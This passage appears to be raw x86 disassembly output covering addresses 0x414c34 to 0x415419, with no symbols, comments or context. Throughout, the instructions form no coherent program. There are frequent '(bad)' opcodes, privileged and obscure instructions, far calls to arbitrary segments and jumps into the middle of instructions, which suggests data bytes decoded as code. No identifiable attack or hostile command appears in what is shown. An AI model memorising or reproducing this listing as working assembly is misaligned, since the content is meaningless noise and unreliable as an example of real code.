  414c34:	adc    ebp,DWORD PTR [ebp+0x4c8d1369]
  414c3a:	addr16 push ebp
  414c3c:	jge    0x414c41
  414c3e:	aas    
  414c3f:	retf   
  414c40:	push   ds
  414c41:	cdq    
  414c42:	jb     0x414cb0
  414c44:	rcl    DWORD PTR [ebp+0x47],cl
  414c47:	rcl    DWORD PTR [eax-0x64c28bc0],0xb9
  414c4e:	xor    dl,0xa
  414c51:	pop    ss
  414c52:	fsub   DWORD PTR [ebp-0x6e]
  414c55:	jl     0x414c07
  414c57:	shl    BYTE PTR [ebx+0x62],cl
  414c5a:	xchg   edi,esi
  414c5c:	(bad)  
  414c5d:	aas    
  414c5e:	pop    ss
  414c5f:	xchg   ebp,eax
  414c60:	cmp    al,0x7e
  414c62:	aaa    
  414c63:	dec    ebp
  414c64:	push   0xffffffac
  414c66:	hlt    
  414c67:	icebp  
  414c68:	push   0x5af2d4d3
  414c6d:	cwde   
  414c6e:	call   FWORD PTR [ebp-0x5820bf0]
  414c74:	dec    eax
  414c75:	ja     0x414c4e
  414c77:	add    bh,BYTE PTR [ecx+ecx*1]
  414c7a:	imul   ebx,DWORD PTR [ebp+edi*4-0x26],0x5d
  414c7f:	repz add edx,ebx
  414c82:	loop   0x414c4a
  414c84:	jge    0x414cc7
  414c86:	or     DWORD PTR [esi-0x1e77f3d4],edi
  414c8c:	pusha  
  414c8d:	je     0x414c44
  414c8f:	retf   0xf11f
  414c92:	cmp    cl,BYTE PTR [eax]
  414c94:	stos   DWORD PTR es:[edi],eax
  414c95:	sbb    DWORD PTR [ebx-0x4af6cae],ebp
  414c9b:	add    ebp,esi
  414c9d:	stc    
  414c9e:	mov    ds:0x3b00b909,al
  414ca3:	cmp    eax,ecx
  414ca5:	(bad)  
  414ca6:	cmp    bl,BYTE PTR [edx-0x61]
  414ca9:	cmp    al,BYTE PTR [esp+eiz*8+0x3eb40d6e]
  414cb0:	out    0x76,eax
  414cb2:	sub    ebx,DWORD PTR [ecx+0x73]
  414cb5:	jne    0x414d2d
  414cb7:	cmp    eax,0xdb8ca0c8
  414cbc:	dec    ebx
  414cbd:	jg     0x414d01
  414cbf:	popa   
  414cc0:	outs   dx,DWORD PTR ds:[esi]
  414cc1:	sub    bh,dl
  414cc3:	or     al,0xa8
  414cc5:	xor    al,0x94
  414cc7:	daa    
  414cc8:	cmc    
  414cc9:	cmp    al,0x3
  414ccb:	jb     0x414c52
  414ccd:	leave  
  414cce:	ficomp DWORD PTR [ebx]
  414cd0:	cmpps  xmm4,XMMWORD PTR [ebx+0x1a],0x90
  414cd5:	jg     0x414cc2
  414cd7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414cd8:	pop    esp
  414cd9:	mov    ebp,DWORD PTR [ebx]
  414cdb:	fs pushf 
  414cdd:	outs   dx,BYTE PTR ds:[esi]
  414cde:	ret    
  414cdf:	pop    ecx
  414ce0:	sub    eax,0x1c060e6
  414ce5:	inc    ebx
  414ce6:	retf   0x2962
  414ce9:	in     eax,0xdc
  414ceb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414cec:	push   ecx
  414ced:	jb     0x414c8f
  414cef:	adc    eax,DWORD PTR [edi+0x7a]
  414cf2:	sbb    al,0xce
  414cf4:	xor    esi,DWORD PTR [ebp-0x3f]
  414cf7:	inc    ecx
  414cf8:	mov    ebp,0x6b21ef5a
  414cfd:	sub    ah,BYTE PTR [esi+0x56]
  414d00:	jg     0x414d05
  414d02:	aas    
  414d03:	fisttp DWORD PTR ss:[edx+ebp*2]
  414d07:	mov    eax,ds:0x4c43ccde
  414d0c:	enter  0x6b35,0x5e
  414d10:	xabort 0x6c
  414d13:	in     al,dx
  414d14:	xchg   BYTE PTR [ecx],ch
  414d16:	shl    BYTE PTR [ebp+eax*8+0x71],0x25
  414d1b:	sbb    DWORD PTR [ebx+0x45],edx
  414d1e:	nop
  414d1f:	mov    bl,0x39
  414d21:	jg     0x414d13
  414d23:	push   ebp
  414d24:	push   ss
  414d25:	xor    BYTE PTR [edx],bl
  414d27:	das    
  414d28:	enter  0x5d0b,0x21
  414d2c:	imul   eax,DWORD PTR [esi+0x19],0x45763b37
  414d33:	inc    ecx
  414d34:	jmp    0x414cd4
  414d36:	in     eax,0xf0
  414d38:	loopne 0x414cdb
  414d3a:	mov    WORD PTR [ebx-0x2cc0e0ed],es
  414d40:	fninit 
  414d42:	mov    al,0x43
  414d44:	dec    esi
  414d45:	mov    fs,WORD PTR [edx+eax*2-0x4b3cac67]
  414d4c:	mov    ch,0xfa
  414d4e:	mov    ebp,0xa6c58c5e
  414d53:	mov    al,ds:0xb0efefdc
  414d58:	jecxz  0x414d4b
  414d5a:	sahf   
  414d5b:	mov    BYTE PTR [ecx],dh
  414d5d:	outs   dx,DWORD PTR ds:[esi]
  414d5e:	je     0x414d6d
  414d60:	mov    ch,BYTE PTR [ebx+ecx*4+0x2082e438]
  414d67:	xor    eax,0x579b55a1
  414d6c:	(bad)  
  414d6d:	cli    
  414d6e:	repnz imul ecx,DWORD PTR ds:0xdc68f469,0x4b
  414d76:	test   eax,0xab285830
  414d7b:	xor    dl,BYTE PTR [edx+0x64bdf485]
  414d81:	cdq    
  414d82:	mov    bl,0xd
  414d84:	add    ch,BYTE PTR [ebx+0x5d]
  414d87:	push   edi
  414d88:	fwait
  414d89:	inc    edi
  414d8a:	add    ch,al
  414d8c:	hlt    
  414d8d:	pop    esi
  414d8e:	fwait
  414d8f:	fs enter 0x278f,0x12
  414d94:	ja     0x414dbe
  414d96:	call   0x3a84:0x9a90ae4e
  414d9d:	jp     0x414d9a
  414d9f:	mov    BYTE PTR [edx],dl
  414da1:	imul   ebx,DWORD PTR [ebx+0x48],0x2
  414da5:	test   eax,esp
  414da7:	mov    DWORD PTR [edi+0x45],edi
  414daa:	xchg   ebp,eax
  414dab:	clc    
  414dac:	adc    ch,dl
  414dae:	pop    ss
  414daf:	cmp    eax,0x74fd45aa
  414db4:	or     ebx,DWORD PTR [eax-0x47]
  414db7:	or     eax,0x339ab202
  414dbc:	fistp  DWORD PTR cs:[esi]
  414dbf:	loop   0x414d7e
  414dc1:	outs   dx,BYTE PTR ds:[esi]
  414dc2:	pop    ebp
  414dc3:	mov    ch,0x57
  414dc5:	xor    al,0x17
  414dc7:	shr    BYTE PTR [esi-0x3c],1
  414dca:	pusha  
  414dcb:	into   
  414dcc:	scas   eax,DWORD PTR es:[edi]
  414dcd:	pop    edi
  414dce:	dec    esi
  414dcf:	in     eax,dx
  414dd0:	xchg   edx,eax
  414dd1:	xchg   edx,eax
  414dd2:	inc    BYTE PTR [edx-0x32]
  414dd5:	fidivr DWORD PTR [edi]
  414dd7:	mov    edi,0x9a62d380
  414ddc:	ins    DWORD PTR es:[edi],dx
  414ddd:	and    al,0xa3
  414ddf:	dec    DWORD PTR [edi-0x2b]
  414de2:	add    al,0x8
  414de4:	addr16 nop
  414de6:	jge    0x414e2c
  414de8:	(bad)  [eax-0x2580e1c1]
  414dee:	xor    eax,0xb471c5cf
  414df3:	jno    0x414e53
  414df5:	adc    BYTE PTR [ebx+ebx*1],ah
  414df8:	mov    ch,0xb5
  414dfa:	cmc    
  414dfb:	xor    bh,BYTE PTR [esi-0x36]
  414dfe:	dec    ecx
  414dff:	int    0x59
  414e01:	clc    
  414e02:	das    
  414e03:	xchg   ebp,eax
  414e04:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414e05:	fidivr WORD PTR [eax-0x4d]
  414e08:	fidivr WORD PTR [edi]
  414e0a:	sar    BYTE PTR [edi],1
  414e0c:	sub    BYTE PTR fs:[edi],bl
  414e0f:	xchg   esp,eax
  414e10:	cmc    
  414e11:	jge    0x414e03
  414e13:	sub    bh,al
  414e15:	sub    DWORD PTR [esi+0xf0846ef],ebx
  414e1b:	je     0x414e57
  414e1d:	xor    eax,0x1c623faf
  414e22:	mov    dh,bl
  414e24:	push   0x427f2f8c
  414e29:	ror    DWORD PTR [edx+0x75302fad],cl
  414e2f:	lds    esp,FWORD PTR [esi+edx*4-0x10]
  414e33:	xchg   ebx,eax
  414e34:	cmp    bl,ah
  414e36:	lahf   
  414e37:	jns    0x414e24
  414e39:	ror    DWORD PTR [ecx],cl
  414e3b:	ins    BYTE PTR es:[edi],dx
  414e3c:	repnz in eax,dx
  414e3e:	jle    0x414ea6
  414e40:	cld    
  414e41:	fsub   DWORD PTR [ecx-0x59acd514]
  414e47:	inc    edi
  414e48:	lods   al,BYTE PTR ds:[esi]
  414e49:	jmp    0x659f:0xe4b09cf
  414e50:	fst    DWORD PTR [ebx]
  414e52:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414e53:	popf   
  414e54:	push   eax
  414e55:	dec    edx
  414e56:	nop
  414e57:	bound  eax,QWORD PTR [ebp-0x3de14ecd]
  414e5d:	mov    WORD PTR [edx+0x563b6ad0],?
  414e63:	(bad)  
  414e64:	sbb    BYTE PTR [eax],bl
  414e66:	(bad)  [ebp+0x6c256663]
  414e6c:	dec    edi
  414e6d:	cmp    DWORD PTR [ecx+esi*8+0x45],0x34d48b6b
  414e75:	and    eax,0xf3d31c54
  414e7a:	ror    DWORD PTR [ecx+0x1723d711],1
  414e80:	xlat   BYTE PTR ds:[ebx]
  414e81:	cmovle esi,ebp
  414e84:	adc    ebp,DWORD PTR [ecx+0x77]
  414e87:	(bad)  
  414e88:	imul   eax,DWORD PTR [eax+0x6fc16701],0x57
  414e8f:	mov    cl,0xed
  414e91:	std    
  414e92:	and    BYTE PTR [ecx-0x38],dl
  414e95:	jmp    0xa3ba812
  414e9a:	or     ecx,esp
  414e9c:	and    edx,DWORD PTR [ebx+0x21]
  414e9f:	push   ss
  414ea0:	pop    esi
  414ea1:	call   0x903d:0x774d5053
  414ea8:	aaa    
  414ea9:	sub    al,0xd9
  414eab:	sbb    ecx,DWORD PTR [ecx-0x617066dc]
  414eb1:	dec    esp
  414eb2:	rol    DWORD PTR [ebp+0x5b],1
  414eb5:	dec    ebp
  414eb6:	dec    eax
  414eb7:	add    BYTE PTR [edi-0x279abf47],dl
  414ebd:	mov    eax,ds:0x8312dac6
  414ec2:	stos   BYTE PTR es:[edi],al
  414ec3:	push   edx
  414ec4:	cmc    
  414ec5:	mov    al,0xc1
  414ec7:	fstp   TBYTE PTR ds:0xca9cff0f
  414ecd:	popa   
  414ece:	sub    DWORD PTR [edi],ebp
  414ed0:	dec    eax
  414ed1:	inc    esp
  414ed2:	aaa    
  414ed3:	push   edx
  414ed4:	push   0x3b
  414ed6:	mov    ds:0x4f8d21da,eax
  414edb:	fstp   TBYTE PTR [ebx-0x2c7d6106]
  414ee1:	push   0x6b45a740
  414ee6:	(bad)  
  414ee7:	test   al,0xbb
  414ee9:	ror    DWORD PTR ds:[edi+0x13d61ab1],0x90
  414ef1:	sub    DWORD PTR cs:[ebp+ebp*8-0x65f125fa],ebx
  414ef9:	or     cl,ch
  414efb:	cmp    BYTE PTR [esp+ecx*1+0x7174bb11],ch
  414f02:	and    al,0xcf
  414f04:	xor    DWORD PTR [esp+eiz*2],0xfffffff6
  414f08:	imul   ebp,DWORD PTR [eax+0x6d7ffc8a],0x3d
  414f0f:	jle    0x414ee3
  414f11:	mov    ch,al
  414f13:	cmp    eax,0xbacb3cf
  414f18:	fcom   QWORD PTR [edi-0x30]
  414f1b:	in     eax,dx
  414f1c:	popa   
  414f1d:	xchg   ebx,eax
  414f1e:	dec    edi
  414f1f:	add    cl,dh
  414f21:	hlt    
  414f22:	jmp    0x414ec3
  414f24:	jb     0x414ef1
  414f26:	call   0xabfd50d8
  414f2b:	and    eax,0x6b3ddb42
  414f30:	cmp    ah,dh
  414f32:	pushf  
  414f33:	xor    dh,cl
  414f35:	cs adc al,0x53
  414f38:	jbe    0x414f05
  414f3a:	jle    0x414f8b
  414f3c:	arpl   WORD PTR [esp+edi*4-0x646328dc],bx
  414f43:	ret    
  414f44:	nop
  414f45:	out    dx,al
  414f46:	sbb    dl,BYTE PTR [eax+0xa]
  414f49:	dec    ecx
  414f4a:	fld    TBYTE PTR [ecx-0x73]
  414f4d:	dec    DWORD PTR [ecx+0x72de419d]
  414f53:	add    eax,0xc3953cb
  414f58:	adc    al,0xd
  414f5a:	mov    ebx,0xdb19fe07
  414f5f:	fild   QWORD PTR [ebx-0x4c0029a]
  414f65:	lahf   
  414f66:	pop    esp
  414f67:	jns    0x414fa9
  414f69:	pop    ecx
  414f6a:	popf   
  414f6b:	fwait
  414f6c:	in     al,dx
  414f6d:	or     eax,0xd49fd689
  414f72:	inc    esp
  414f73:	xor    ecx,DWORD PTR [ecx-0x6580fff6]
  414f79:	pop    ebp
  414f7a:	and    DWORD PTR [edi],0xc1bc0805
  414f80:	test   DWORD PTR [eax],edx
  414f82:	jmp    0x25bf4ace
  414f87:	adc    eax,0x9f0ddd6d
  414f8c:	addr16 adc al,0x2c
  414f8f:	icebp  
  414f90:	sub    al,0xec
  414f92:	gs pop esi
  414f94:	gs out 0x9d,eax
  414f97:	data16 jns 0x414f60
  414f9a:	and    ah,BYTE PTR [esi]
  414f9c:	mov    DWORD PTR [edi],ebp
  414f9e:	sub    BYTE PTR [ebp-0x5b8aa4],0x26
  414fa5:	popfw  
  414fa7:	cmp    eax,esi
  414fa9:	push   ecx
  414faa:	stos   DWORD PTR es:[edi],eax
  414fab:	or     al,0x59
  414fad:	pop    ecx
  414fae:	gs push edx
  414fb0:	shr    DWORD PTR [ecx],0xb
  414fb3:	mov    al,ds:0xbae3e4b2
  414fb8:	les    ebx,FWORD PTR [ecx-0x511b5c0c]
  414fbe:	daa    
  414fbf:	jmp    0x4e25:0x1d2a48b9
  414fc6:	(bad)  
  414fc7:	test   al,0x23
  414fca:	ss js  0x414f9f
  414fcd:	mov    ch,0xa6
  414fcf:	aam    0x4
  414fd1:	ja     0x41503d
  414fd3:	or     ch,bl
  414fd5:	mov    cl,BYTE PTR [ecx]
  414fd7:	cmp    DWORD PTR [ecx],edi
  414fd9:	and    esp,DWORD PTR [esi-0x5c]
  414fdc:	mov    fs,edx
  414fde:	(bad)  
  414fdf:	mov    BYTE PTR [esi],ah
  414fe1:	test   dl,dh
  414fe3:	jecxz  0x414f8a
  414fe5:	push   cs
  414fe6:	lea    esi,[edi-0x4f1d362d]
  414fec:	cmp    al,0x23
  414fee:	shl    esp,1
  414ff0:	fcomp  QWORD PTR [ebp+0x12]
  414ff3:	jle    0x414f7a
  414ff5:	dec    edi
  414ff6:	mov    dl,0xd7
  414ff8:	pop    esp
  414ff9:	sbb    esi,edx
  414ffb:	xor    DWORD PTR [edi],ebx
  414ffd:	mov    esi,0x5ee58f9
  415002:	rcl    DWORD PTR [ecx-0x52c68744],cl
  415008:	popf   
  415009:	xor    al,0x4b
  41500b:	cld    
  41500c:	pop    ds
  41500d:	ss addr16 push eax
  415010:	pop    edx
  415011:	ss iret 
  415013:	scas   eax,DWORD PTR es:[edi]
  415014:	stc    
  415015:	pop    ebx
  415016:	or     eax,0x9bb14ba9
  41501b:	or     al,0xb
  41501d:	mov    DWORD PTR [esi+0x1db77322],ebx
  415023:	loope  0x414fbd
  415025:	mov    BYTE PTR [esi-0x39],bl
  415028:	pop    esi
  415029:	int    0xd3
  41502b:	pop    esi
  41502c:	xlat   BYTE PTR ds:[ebx]
  41502d:	rol    DWORD PTR [ebp+0x7a],0x63
  415031:	jge    0x415038
  415033:	mov    ebx,0x53dee457
  415038:	je     0x415059
  41503a:	leave  
  41503b:	xor    dh,BYTE PTR [edx]
  41503d:	loope  0x414ff0
  41503f:	inc    edx
  415040:	rcpps  xmm3,XMMWORD PTR [ebp+0x26627783]
  415047:	xchg   bh,bl
  415049:	fist   DWORD PTR [edx+0x723386b4]
  41504f:	stos   DWORD PTR es:[edi],eax
  415050:	push   edi
  415051:	mov    dl,0x1
  415053:	inc    esp
  415054:	int3   
  415055:	jle    0x415018
  415057:	or     DWORD PTR [ecx],edx
  415059:	repnz rcr BYTE PTR [esi],cl
  41505c:	push   edx
  41505d:	push   DWORD PTR [ecx+0x697f3ed2]
  415063:	or     al,0x4c
  415065:	pop    esi
  415066:	or     eax,0xd6f9e387
  41506b:	or     cl,BYTE PTR [esi+0xa200d31]
  415071:	mov    ah,BYTE PTR [eax]
  415073:	call   0xd199:0x2541b9e5
  41507a:	xor    al,al
  41507c:	inc    edx
  41507d:	(bad)  
  41507e:	jmp    0x762b:0xf96c7382
  415085:	stos   BYTE PTR es:[edi],al
  415086:	sub    ecx,0x6efa4607
  41508c:	fld    TBYTE PTR [esi]
  41508e:	arpl   ax,sp
  415090:	add    eax,0x66642ffd
  415095:	jp     0x415045
  415097:	cdq    
  415098:	clc    
  415099:	and    al,0x92
  41509b:	add    edx,DWORD PTR [esi+0x28]
  41509e:	dec    BYTE PTR [edx-0x91238cc]
  4150a4:	mov    dl,BYTE PTR [edi+0x5e]
  4150a7:	dec    esp
  4150a8:	call   0x9358f0d3
  4150ad:	dec    ebx
  4150ae:	mov    cl,0xa8
  4150b0:	fs sub eax,0x2fe02794
  4150b6:	into   
  4150b7:	sti    
  4150b8:	mov    al,gs:0xce919b53
  4150be:	mov    bl,BYTE PTR [esi-0x33]
  4150c1:	ds and al,0xf5
  4150c4:	dec    ebx
  4150c5:	mov    ebp,0x5b80bb35
  4150ca:	sub    cl,BYTE PTR [esi]
  4150cc:	pop    edx
  4150cd:	pusha  
  4150ce:	push   ds
  4150cf:	sar    DWORD PTR [edx-0x14],0xe7
  4150d3:	cmp    al,0xfe
  4150d5:	inc    eax
  4150d6:	add    al,bh
  4150d8:	add    eax,0xdda7070a
  4150dd:	xchg   ebp,eax
  4150de:	(bad)  
  4150df:	shr    BYTE PTR ss:[eax],cl
  4150e2:	jle    0x415094
  4150e4:	lods   eax,DWORD PTR ds:[esi]
  4150e5:	adc    DWORD PTR [esi+0x26],eax
  4150e8:	ins    DWORD PTR es:[edi],dx
  4150e9:	push   ss
  4150ea:	sub    DWORD PTR [esi],edx
  4150ec:	fcomp  DWORD PTR [ebx+ebp*8]
  4150ef:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  4150f1:	data16 out dx,al
  4150f3:	ins    BYTE PTR es:[edi],dx
  4150f4:	dec    eax
  4150f5:	loopne 0x41514a
  4150f7:	sbb    al,0xa
  4150f9:	aas    
  4150fa:	or     DWORD PTR [ecx-0x64d59aba],eax
  415100:	xchg   ecx,eax
  415101:	shr    BYTE PTR [edx+0x5d],cl
  415104:	aad    0x57
  415106:	pop    eax
  415107:	sbb    esp,DWORD PTR [edx+0x5ae7b61f]
  41510d:	pop    edi
  41510e:	nop
  41510f:	push   es
  415110:	mov    dl,0x7e
  415112:	jecxz  0x415127
  415114:	ss pop ecx
  415116:	or     DWORD PTR [esi+ecx*1-0x5d],0x71
  41511b:	inc    edx
  41511c:	sti    
  41511d:	mov    ecx,0x7aeeb3a3
  415122:	mov    ds:0x60743640,eax
  415127:	mov    dh,0xf2
  415129:	mov    ah,0x93
  41512b:	add    DWORD PTR [ebp-0x4d],edx
  41512e:	stos   DWORD PTR es:[edi],eax
  41512f:	push   edx
  415130:	add    DWORD PTR [edx-0x80],ebp
  415133:	add    ah,BYTE PTR ds:0x670b9391
  415139:	hlt    
  41513a:	repnz and ecx,ebx
  41513d:	dec    esi
  41513e:	iret   
  41513f:	fmulp  st(0),st
  415141:	sbb    eax,0x182451fc
  415146:	je     0x4151b5
  415148:	push   ds
  415149:	jmp    0x41515d
  41514b:	cs jmp 0xdb1c:0x2fc92a2a
  415153:	xchg   edx,eax
  415154:	mov    bh,0x8
  415156:	pop    edx
  415157:	test   eax,0x229b3558
  41515c:	ror    BYTE PTR [esi-0x3e],1
  41515f:	daa    
  415160:	push   esp
  415161:	int    0x75
  415163:	inc    edi
  415164:	or     eax,0xf0617455
  415169:	not    BYTE PTR [edi+0x1a0034d3]
  41516f:	inc    ebx
  415170:	call   0x3951:0x1d08941d
  415177:	jle    0x41511f
  415179:	mov    al,ds:0x3e3429d9
  41517e:	call   0x93ad52c6
  415183:	jb     0x4151f0
  415185:	jae    0x41511a
  415187:	hlt    
  415188:	sub    eax,0x41795b74
  41518e:	shl    edi,1
  415190:	dec    ebp
  415191:	cwde   
  415192:	inc    esp
  415193:	lock imul eax,DWORD PTR [ecx-0x64],0xffffffaa
  415198:	mov    bh,0x77
  41519a:	out    0xf9,eax
  41519c:	aad    0xff
  41519e:	leave  
  41519f:	pop    ebx
  4151a0:	in     al,dx
  4151a1:	pop    eax
  4151a2:	enter  0xe0f4,0xca
  4151a6:	sar    ebx,1
  4151a8:	ret    
  4151a9:	mov    ds:0x2127622e,eax
  4151ae:	retf   0x6de7
  4151b1:	jmp    0xbecb:0xf475ff82
  4151b8:	xor    bh,dl
  4151ba:	jo     0x415209
  4151bc:	jns    0x415140
  4151be:	mov    edx,0xc09cdcf
  4151c3:	lock lahf 
  4151c5:	shl    DWORD PTR [esi+0x4a],1
  4151c8:	sbb    DWORD PTR [esi-0x1d],ecx
  4151cb:	sub    DWORD PTR [eax+0x181be55b],eax
  4151d1:	stc    
  4151d2:	cwde   
  4151d3:	arpl   WORD PTR [esi-0x78abf812],bp
  4151d9:	add    eax,0xef9c7ffe
  4151de:	dec    eax
  4151df:	lock mov ?,WORD PTR [esi-0x42]
  4151e3:	mov    ecx,DWORD PTR [eax]
  4151e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4151e6:	inc    esi
  4151e7:	pop    ds
  4151e8:	leave  
  4151e9:	clc    
  4151ea:	sbb    DWORD PTR [ebx-0x40],0xffffff8e
  4151ee:	push   esp
  4151ef:	mov    ah,BYTE PTR [eax]
  4151f1:	loop   0x415208
  4151f3:	add    DWORD PTR [ebp+0x62108e2e],esp
  4151f9:	lods   eax,DWORD PTR ds:[esi]
  4151fa:	scas   al,BYTE PTR es:[edi]
  4151fb:	mov    esi,0xb23585f3
  415200:	cs gs jno 0x415243
  415204:	dec    BYTE PTR [edx-0x1f31ca05]
  41520a:	and    ebx,DWORD PTR [ecx+0x19]
  41520d:	sbb    DWORD PTR [ecx+0xc],edi
  415210:	cld    
  415211:	adc    BYTE PTR [edx],dh
  415213:	or     DWORD PTR [esp+esi*8-0x4cd5f2b7],ebp
  41521a:	and    eax,0x8b8f8c7f
  41521f:	sub    dl,BYTE PTR [edx-0x3693ec1f]
  415225:	mov    edx,0x97e18e88
  41522a:	gs out dx,eax
  41522c:	and    al,0xbb
  41522e:	xor    eax,0xf75f5c1b
  415233:	(bad)  
  415235:	retf   
  415236:	shr    ah,1
  415238:	mov    ds:0x75181086,eax
  41523d:	mov    esp,0xa52a1207
  415242:	cmp    ecx,DWORD PTR [bp-0x80]
  415246:	enter  0x25f1,0xa3
  41524a:	bound  edx,QWORD PTR [edi-0x27f1e7af]
  415250:	jg     0x41525e
  415252:	sub    esp,DWORD PTR [edx]
  415254:	mov    edi,0xd5dc4e55
  415259:	mov    al,ds:0xc6c42f82
  41525e:	xchg   ebx,eax
  41525f:	cmp    al,0x51
  415261:	js     0x415213
  415263:	lock xor edx,DWORD PTR [edi]
  415266:	cmp    ch,BYTE PTR [ebx+0x37a33515]
  41526c:	mov    BYTE PTR ds:0x595b0d3c,cl
  415272:	inc    esi
  415273:	sar    dl,cl
  415275:	in     eax,0x92
  415277:	pushf  
  415278:	call   ebx
  41527a:	xor    eax,0x8ad543ae
  41527f:	das    
  415280:	add    ecx,edx
  415282:	sub    dl,BYTE PTR [eax-0x5f]
  415285:	cmp    BYTE PTR [ecx+0xe],ah
  415288:	aam    0x28
  41528a:	mov    ds:0x8e2888a6,al
  41528f:	xor    BYTE PTR [edx-0x19506cb3],al
  415295:	or     bl,BYTE PTR [esi]
  415297:	inc    eax
  415298:	inc    esi
  415299:	sub    cl,ah
  41529b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41529c:	data16 jecxz 0x415313
  41529f:	xchg   edi,eax
  4152a0:	and    BYTE PTR [edi-0x6],ah
  4152a3:	imul   esp,DWORD PTR [edi-0x1e],0xeac0f343
  4152aa:	rol    BYTE PTR [esi-0xdc172cd],0xd3
  4152b1:	inc    ebp
  4152b2:	mov    ds:0x7d751fcc,al
  4152b7:	stos   DWORD PTR es:[edi],eax
  4152b8:	inc    ebp
  4152b9:	or     eax,0x2d6d2c5f
  4152be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4152bf:	ins    DWORD PTR es:[edi],dx
  4152c0:	das    
  4152c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4152c2:	inc    ebx
  4152c3:	xlat   BYTE PTR ds:[ebx]
  4152c4:	cmc    
  4152c5:	jb     0x41525c
  4152c7:	inc    edi
  4152c8:	pushf  
  4152c9:	pop    ds
  4152ca:	mov    ebx,0x9969b0eb
  4152cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4152d0:	nop
  4152d1:	or     al,0x81
  4152d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4152d4:	or     esp,eax
  4152d6:	mov    eax,ds:0xf53f4a
  4152db:	mov    ch,0xdb
  4152dd:	or     al,0x80
  4152df:	cwde   
  4152e0:	adc    dl,dh
  4152e2:	out    0x23,al
  4152e4:	push   0x33
  4152e6:	pop    ebp
  4152e7:	mov    ds:0x3c9da72f,eax
  4152ec:	push   edx
  4152ee:	fcomp  DWORD PTR [ebp+0x30]
  4152f1:	in     eax,0x8e
  4152f3:	stos   DWORD PTR es:[edi],eax
  4152f4:	jne    0x415375
  4152f6:	aam    0xc1
  4152f8:	neg    DWORD PTR [ebp-0x60]
  4152fb:	jl     0x415352
  4152fd:	imul   edi,DWORD PTR [eax-0x5af00d5],0x66
  415304:	push   0xffffff9a
  415306:	push   ss
  415307:	xchg   ecx,eax
  415308:	mov    DWORD PTR [edi+0x19],eax
  41530b:	fwait
  41530c:	mov    bh,0x6f
  41530e:	lods   al,BYTE PTR ds:[esi]
  41530f:	test   al,0x27
  415311:	cmp    DWORD PTR [ecx+0x24],esi
  415314:	cmp    BYTE PTR [ecx+ecx*8+0x57c8269],bh
  41531b:	add    edx,DWORD PTR [edx+eax*2]
  41531e:	jle    0x41538f
  415320:	shl    DWORD PTR [eax],0xb1
  415323:	inc    ebp
  415324:	repnz repz in al,0x4a
  415328:	rol    DWORD PTR [ebp-0x1eac4d32],1
  41532e:	xchg   edx,eax
  41532f:	push   ds
  415330:	push   ss
  415331:	add    eax,0x241ff2f6
  415336:	int    0x83
  415338:	icebp  
  415339:	inc    esp
  41533a:	dec    edi
  41533b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41533c:	add    eax,0x3622c87b
  415341:	mov    ds:0xb0fb4136,al
  415346:	xchg   BYTE PTR [eax+0x764f95e2],al
  41534c:	mov    ebx,0x4a6e42
  415351:	xlat   BYTE PTR ds:[ebx]
  415352:	emms   
  415354:	int3   
  415355:	sbb    eax,0x26
  415358:	adc    BYTE PTR [esi+0x3fd17394],bh
  41535e:	push   0x64
  415360:	and    ah,bh
  415362:	cmp    DWORD PTR [ebp+0x6],0x62a444b0
  415369:	xor    esi,DWORD PTR [esi]
  41536b:	or     DWORD PTR ss:[esi-0x1a],eax
  41536f:	retf   
  415370:	push   cs
  415371:	or     eax,0x4eb7489
  415376:	cli    
  415377:	mov    bh,al
  415379:	mov    dl,0x94
  41537b:	xchg   esi,eax
  41537c:	xchg   esp,eax
  41537d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41537e:	mov    cl,0x2c
  415380:	neg    DWORD PTR [ecx]
  415382:	mov    eax,ds:0xca41cb66
  415387:	mov    esi,0x8262f5d1
  41538c:	test   DWORD PTR [edx],0xc09483e0
  415392:	cmp    ebp,DWORD PTR [edx+eax*8+0x4b2e7d59]
  415399:	xor    ecx,esp
  41539b:	pop    esi
  41539c:	push   eax
  41539d:	repnz dec eax
  41539f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4153a0:	pop    esp
  4153a1:	cmp    eax,0x4da99867
  4153a6:	dec    edi
  4153a7:	fs mov ebp,0x25c71fb5
  4153ad:	out    0x84,eax
  4153af:	cmp    ebp,DWORD PTR [eax+0x39034955]
  4153b5:	and    eax,0xd9c768e8
  4153ba:	sub    eax,0xe1607416
  4153bf:	fwait
  4153c0:	jl     0x415354
  4153c2:	jl     0x4153ef
  4153c4:	and    BYTE PTR [ebp+0x6519b621],dh
  4153ca:	ss (bad) 
  4153cc:	sbb    bl,BYTE PTR [eax-0x54e658f7]
  4153d2:	push   es
  4153d3:	adc    DWORD PTR [edi+0x10],0xffffffe5
  4153d7:	test   DWORD PTR [edi-0x40],0xd73f5762
  4153de:	mov    ch,0x4b
  4153e0:	lods   al,BYTE PTR ds:[esi]
  4153e1:	loop   0x4153fe
  4153e3:	cmp    esi,DWORD PTR [esi-0x54f8cd67]
  4153e9:	out    dx,al
  4153ea:	xchg   ebx,eax
  4153eb:	inc    eax
  4153ec:	pusha  
  4153ed:	push   0x2c
  4153ef:	jae    0x41537d
  4153f1:	cmc    
  4153f2:	or     al,0x10
  4153f4:	retf   0x1e97
  4153f7:	xlat   BYTE PTR ds:[ebx]
  4153f8:	dec    ebx
  4153f9:	mov    al,ds:0x567952b
  4153fe:	inc    ebx
  4153ff:	fistp  DWORD PTR [ebp-0x41298d04]
  415405:	pop    ecx
  415406:	nop
  415407:	fisttp QWORD PTR [eax-0x24]
  41540a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41540b:	pop    eax
  41540c:	adc    al,al
  41540e:	leave  
  41540f:	leave  
  415410:	and    ah,dl
  415412:	sbb    esp,DWORD PTR [eax]
  415414:	call   0x86a94544
  415419:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
